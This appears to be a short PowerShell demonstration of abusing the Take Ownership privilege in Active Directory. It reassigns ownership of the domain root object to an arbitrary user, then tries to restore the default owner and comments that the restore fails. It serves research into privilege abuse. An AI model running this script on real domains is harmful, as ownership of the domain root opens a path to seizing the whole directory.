#Take ownership on domain root with SeTakeOwnershipPrivilege (Take Ownership of Files and Directories)
$DN = (Get-ADDomain).DistinguishedName
$ACL = Get-Acl $DN
$ACL.Owner
$NewOwner = New-Object System.Security.Principal.NTAccount((Get-ADDomain).NetBIOSName, "LiterallyAnyUser")
$ACL.SetOwner($NewOwner)
Set-ACL -Path $DN -AclObject $ACL

#Set it back to the default
$ACL = Get-Acl $DN
$NewOwner = New-Object System.Security.Principal.NTAccount("BUILTIN", "Administrators")
$ACL.SetOwner($NewOwner)
Set-ACL -Path $DN -AclObject $ACL

## Oops, we can't set it back to BUILTIN\Administrators anymore
$NewOwner = New-Object System.Security.Principal.NTAccount((Get-ADDomain).NetBIOSName, "Administrators")
$ACL.SetOwner($NewOwner)
Set-ACL -Path $DN -AclObject $ACL